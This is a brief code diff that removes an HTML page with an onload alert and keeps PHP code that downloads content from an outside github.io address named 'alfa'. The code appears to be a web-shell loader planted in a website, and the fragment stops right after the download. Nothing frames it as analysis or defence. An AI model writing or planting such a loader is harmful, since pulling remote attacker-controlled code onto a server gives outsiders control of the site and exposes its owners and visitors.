@@ -1,6 +1,3 @@
-<!DOCTYPE html>
-<body onload=alert(".")>
-</html>
 <?php
 $pff = "https://dfchkqp.github.io/alfa";
 $puff = file_get_contents($pff); 
